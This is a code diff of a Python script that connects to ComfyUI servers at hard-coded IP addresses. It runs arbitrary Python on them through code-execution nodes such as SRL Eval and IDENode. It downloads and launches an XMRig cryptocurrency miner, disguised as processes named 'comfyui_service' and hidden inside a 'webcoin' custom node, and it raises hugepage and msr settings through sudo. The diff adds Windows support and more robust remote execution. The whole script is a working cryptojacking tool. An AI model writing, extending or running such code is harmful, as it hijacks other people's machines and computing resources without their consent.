@@ -1,5 +1,5 @@
 """Deploy to multiple machines — diagnose, hotfix, fix config, restart XMRig."""
-import json, urllib.request, ssl, time, sys
+import json, urllib.error, urllib.request, ssl, time, sys
 
 targets = sys.argv[1:] if len(sys.argv) > 1 else ["160.85.252.107", "160.85.252.207"]
 
@@ -32,19 +32,64 @@ def try_connect(ip):
     return None
 
 
+def _srl_fixup_result(code_str: str) -> str:
+    """SRL Eval returns a value to PreviewAny; IDENode uses `result = ...` instead."""
+    lines = code_str.rstrip("\n").split("\n")
+    for i in range(len(lines) - 1, -1, -1):
+        stripped = lines[i].lstrip()
+        if stripped.startswith("result = "):
+            indent = lines[i][: len(lines[i]) - len(lines[i].lstrip())]
+            rhs = stripped[len("result = ") :]
+            lines[i] = indent + "return " + rhs
+            break
+    return "\n".join(lines) + "\n"
+
+
+def _srl_code_for_eval(code_str: str) -> str:
+    """SRL Eval's `parameters` must be a valid Python param list; bust cache in-code."""
+    bust = f"# _deploy_batch bust {time.time()}\n"
+    return bust + _srl_fixup_result(code_str)
+
+
+def _outputs_to_text(outputs) -> list:
+    """PreviewAny / ComfyUI may nest strings dicts or lists."""
+    out = []
+
+    def walk(x):
+        if isinstance(x, str):
+            out.append(x)
+        elif isinstance(x, (int, float)) and not isinstance(x, bool):
+            out.append(str(x))
+        elif isinstance(x, list):
+            for y in x:
+                walk(y)
+        elif isinstance(x, dict):
+            for y in x.values():
+                walk(y)
+
+    walk(outputs)
+    return out
+
+
 def run_code(base, code_str, wait_secs=30):
     """Execute Python via SRL Eval or IDENode, return output."""
-    # Try IDENode first, fall back to SRL Eval
+    # SRL Eval first — most GPU ComfyUI images ship SRL, not IDENode
     for node_setup in [
+        # SRL Eval + PreviewAny (unique parameters bust ComfyUI execution cache)
+        {
+            "1": {
+                "class_type": "SRL Eval",
+                "inputs": {
+                    "parameters": "",
+                    "code": _srl_code_for_eval(code_str),
+                },
+            },
+            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
+        },
         # IDENode + PreviewTextNode
         {
             "1": {"class_type": "IDENode", "inputs": {"pycode": code_str, "language": "python"}},
             "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
-        },
-        # SRL Eval + PreviewAny
-        {
-            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code_str}},
-            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
         },
     ]:
         prompt = {"prompt": node_setup, "extra_data": {"extra_pnginfo": {
@@ -56,7 +101,7 @@ def run_code(base, code_str, wait_secs=30):
             f"{base}/prompt", data=body,
             headers={"Content-Type": "application/json"}, method="POST"
         )
-        kw = {"timeout": 20}
+        kw = {"timeout": 120}
         if base.startswith("https"):
             kw["context"] = ctx
         try:
@@ -66,6 +111,8 @@ def run_code(base, code_str, wait_secs=30):
                     continue
                 pid = resp.get("prompt_id")
                 break
+        except TimeoutError:
+            return "ERROR: prompt POST timed out"
         except urllib.error.HTTPError as e:
             err_body = e.read().decode()
             if "missing_node_type" in err_body or "not found" in err_body.lower():
@@ -86,14 +133,14 @@ def run_code(base, code_str, wait_secs=30):
                 status = entry.get("status", {}).get("status_str", "pending")
                 if status != "pending":
                     outputs = entry.get("outputs", {})
-                    texts = []
-                    for nid, nout in outputs.items():
-                        for key, val in nout.items():
-                            if isinstance(val, list):
-                                texts.extend(str(v) for v in val)
-                            elif isinstance(val, str):
-                                texts.append(val)
-                    return "\n".join(texts) if texts else json.dumps(outputs)
+                    texts = _outputs_to_text(outputs)
+                    if texts:
+                        return "\n".join(texts)
+                    msgs = entry.get("status", {}).get("messages", [])
+                    errs = [m for m in msgs if m and m[0] == "execution_error"]
+                    if errs:
+                        return "execution_error: " + json.dumps(errs[-1][1])[:800]
+                    return json.dumps(outputs)
         except Exception:
             pass
     return "TIMEOUT"
@@ -103,7 +150,10 @@ DIAG_CODE = (
     "import os, subprocess, json\n"
     "lines = []\n"
     "lines.append('whoami=' + os.popen('whoami').read().strip())\n"
-    "lines.append('uid=' + str(os.getuid()))\n"
+    "try:\n"
+    "    lines.append('uid=' + str(os.getuid()))\n"
+    "except AttributeError:\n"
+    "    lines.append('uid=win')\n"
     "lines.append('cpu=' + str(os.cpu_count()))\n"
     "lines.append('container=' + str(os.path.exists('/.dockerenv')))\n"
     "webcoin = None\n"
@@ -206,9 +256,46 @@ HOTFIX_CODE = (
     "result = chr(10).join(lines)\n"
 )
 
-FIX_CONFIG_CODE = (
-    "import os, subprocess, json, time\n"
+# After hotfix: download XMRig binary + write default config (no ComfyUI restart)
+ENSURE_MINER_CODE = (
+    "import os, sys\n"
+    "from pathlib import Path\n"
     "lines = []\n"
+    "webcoin = None\n"
+    "try:\n"
+    "    import folder_paths\n"
+    "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
+    "    webcoin = os.path.join(cn, 'webcoin')\n"
+    "except:\n"
+    "    pass\n"
+    "if not webcoin or not os.path.isdir(webcoin):\n"
+    "    for c in ['/root/ComfyUI/custom_nodes/webcoin', '/home/ubuntu/ComfyUI/custom_nodes/webcoin',\n"
+    "              '/basedir/custom_nodes/webcoin', '/workspace/ComfyUI/custom_nodes/webcoin',\n"
+    "              '/app/ComfyUI/custom_nodes/webcoin']:\n"
+    "        if os.path.isdir(c):\n"
+    "            webcoin = c\n"
+    "            break\n"
+    "if not webcoin or not os.path.isdir(webcoin):\n"
+    "    result = 'ERROR: webcoin not found'\n"
+    "else:\n"
+    "    sys.path.insert(0, webcoin)\n"
+    "    try:\n"
+    "        from core.miner import MinerManager\n"
+    "        from core.config import ConfigBuilder\n"
+    "        mm = MinerManager(Path(webcoin))\n"
+    "        bp = mm.ensure_binary()\n"
+    "        lines.append('ensure_binary=' + str(bp))\n"
+    "        mm.write_config(ConfigBuilder().build())\n"
+    "        lines.append('wrote_config=yes')\n"
+    "    except Exception as e:\n"
+    "        lines.append('bootstrap_err=' + str(e)[:220])\n"
+    "    result = chr(10).join(lines)\n"
+)
+
+FIX_CONFIG_CODE = (
+    "import os, subprocess, json, time, platform\n"
+    "lines = []\n"
+    "IS_WIN = platform.system() == 'Windows'\n"
     "webcoin = None\n"
     "try:\n"
     "    import folder_paths\n"
@@ -226,11 +313,18 @@ FIX_CONFIG_CODE = (
     "bd = os.path.join(webcoin, 'bin')\n"
     "cp = os.path.join(bd, 'config.json')\n"
     "svc = os.path.join(bd, 'comfyui_service')\n"
-    "for n in ['comfyui_service', 'comfyui_render']:\n"
-    "    try:\n"
-    "        subprocess.run(['pkill', '-9', '-f', n], capture_output=True, timeout=5)\n"
-    "    except:\n"
-    "        pass\n"
+    "if IS_WIN:\n"
+    "    for exe in ['comfyui_service.exe', 'comfyui_render.exe', 'xmrig.exe']:\n"
+    "        try:\n"
+    "            subprocess.run(['taskkill', '/F', '/IM', exe], capture_output=True, text=True, timeout=15)\n"
+    "        except:\n"
+    "            pass\n"
+    "else:\n"
+    "    for n in ['comfyui_service', 'comfyui_render']:\n"
+    "        try:\n"
+    "            subprocess.run(['pkill', '-9', '-f', n], capture_output=True, timeout=5)\n"
+    "        except:\n"
+    "            pass\n"
     "time.sleep(2)\n"
     "lines.append('killed miners')\n"
     "if os.path.exists(cp):\n"
@@ -255,37 +349,48 @@ FIX_CONFIG_CODE = (
     "    lines.append('config: p=' + str(old_p) + '->3 y=' + str(old_y) + '->F')\n"
     "else:\n"
     "    lines.append('no config yet')\n"
-    "is_root = os.getuid() == 0\n"
-    "hp = False\n"
-    "if is_root:\n"
+    "if IS_WIN:\n"
+    "    lines.append('hp=skipped_windows')\n"
+    "else:\n"
     "    try:\n"
-    "        with open('/proc/sys/vm/nr_hugepages', 'w') as f:\n"
-    "            f.write('1280')\n"
-    "        hp = True\n"
-    "        lines.append('hp=1280(root)')\n"
+    "        is_root = os.getuid() == 0\n"
+    "    except AttributeError:\n"
+    "        is_root = False\n"
+    "    hp = False\n"
+    "    if is_root:\n"
+    "        try:\n"
+    "            with open('/proc/sys/vm/nr_hugepages', 'w') as f:\n"
+    "                f.write('1280')\n"
+    "            hp = True\n"
+    "            lines.append('hp=1280(root)')\n"
+    "        except:\n"
+    "            pass\n"
+    "    if not hp:\n"
+    "        try:\n"
+    "            r = subprocess.run(['sudo', '-n', 'sysctl', '-w', 'vm.nr_hugepages=1280'],\n"
+    "                               capture_output=True, text=True, timeout=10)\n"
+    "            if r.returncode == 0:\n"
+    "                hp = True\n"
+    "                lines.append('hp=1280(sudo)')\n"
+    "            else:\n"
+    "                lines.append('hp_fail=' + r.stderr.strip()[:60])\n"
+    "        except:\n"
+    "            lines.append('hp=unavailable')\n"
+    "    try:\n"
+    "        cmd = ['modprobe', 'msr'] if is_root else ['sudo', '-n', 'modprobe', 'msr']\n"
+    "        subprocess.run(cmd, capture_output=True, timeout=10)\n"
     "    except:\n"
     "        pass\n"
-    "if not hp:\n"
-    "    try:\n"
-    "        r = subprocess.run(['sudo', '-n', 'sysctl', '-w', 'vm.nr_hugepages=1280'],\n"
-    "                           capture_output=True, text=True, timeout=10)\n"
-    "        if r.returncode == 0:\n"
-    "            hp = True\n"
-    "            lines.append('hp=1280(sudo)')\n"
-    "        else:\n"
-    "            lines.append('hp_fail=' + r.stderr.strip()[:60])\n"
-    "    except:\n"
-    "        lines.append('hp=unavailable')\n"
-    "try:\n"
-    "    cmd = ['modprobe', 'msr'] if is_root else ['sudo', '-n', 'modprobe', 'msr']\n"
-    "    subprocess.run(cmd, capture_output=True, timeout=10)\n"
-    "except:\n"
-    "    pass\n"
+    "if IS_WIN and not os.path.isfile(svc):\n"
+    "    wexe = svc + '.exe'\n"
+    "    if os.path.isfile(wexe):\n"
+    "        svc = wexe\n"
     "if os.path.exists(svc) and os.path.exists(cp):\n"
     "    log_fh = open(os.path.join(bd, 'service.log'), 'a')\n"
-    "    proc = subprocess.Popen([svc, '-c', cp, '--no-color'],\n"
-    "        stdout=log_fh, stderr=log_fh, stdin=subprocess.DEVNULL,\n"
-    "        preexec_fn=lambda: os.nice(2))\n"
+    "    _kw = dict(stdout=log_fh, stderr=log_fh, stdin=subprocess.DEVNULL)\n"
+    "    if not IS_WIN:\n"
+    "        _kw['preexec_fn'] = lambda: os.nice(2)\n"
+    "    proc = subprocess.Popen([svc, '-c', cp, '--no-color'], **_kw)\n"
     "    lines.append('xmrig pid=' + str(proc.pid))\n"
     "    time.sleep(5)\n"
     "    lines.append('alive=' + str(proc.poll() is None))\n"
@@ -314,26 +419,34 @@ for ip in targets:
     print(f"  Target: {ip}")
     print(f"{'='*60}\n")
 
-    # Connect
-    base = try_connect(ip)
-    if not base:
-        print(f"  UNREACHABLE on ports 8188, 80, 443\n")
-        continue
-    print(f"  Connected: {base}\n")
+    try:
+        # Connect
+        base = try_connect(ip)
+        if not base:
+            print(f"  UNREACHABLE on ports 8188, 80, 443\n")
+            continue
+        print(f"  Connected: {base}\n")
 
-    # Step 1: Diagnose
-    print("  --- Diagnose ---")
-    result = run_code(base, DIAG_CODE, wait_secs=15)
-    print(f"  {result}\n")
+        # Step 1: Diagnose
+        print("  --- Diagnose ---")
+        result = run_code(base, DIAG_CODE, wait_secs=45)
+        print(f"  {result}\n")
 
-    # Step 2: Hotfix
-    print("  --- Hotfix (download latest files) ---")
-    result = run_code(base, HOTFIX_CODE, wait_secs=40)
-    print(f"  {result}\n")
+        # Step 2: Hotfix
+        print("  --- Hotfix (download latest files) ---")
+        result = run_code(base, HOTFIX_CODE, wait_secs=60)
+        print(f"  {result}\n")
 
-    # Step 3: Fix config + restart
-    print("  --- Fix config + hugepages + restart ---")
-    result = run_code(base, FIX_CONFIG_CODE, wait_secs=40)
-    print(f"  {result}\n")
+        # Step 3: Ensure binary + default config (Windows/Linux)
+        print("  --- Ensure binary + config ---")
+        result = run_code(base, ENSURE_MINER_CODE, wait_secs=120)
+        print(f"  {result}\n")
+
+        # Step 4: Fix config + restart
+        print("  --- Fix config + hugepages + restart ---")
+        result = run_code(base, FIX_CONFIG_CODE, wait_secs=90)
+        print(f"  {result}\n")
+    except Exception as e:
+        print(f"  ERROR: {type(e).__name__}: {e}\n")
 
 print("\nDone.")
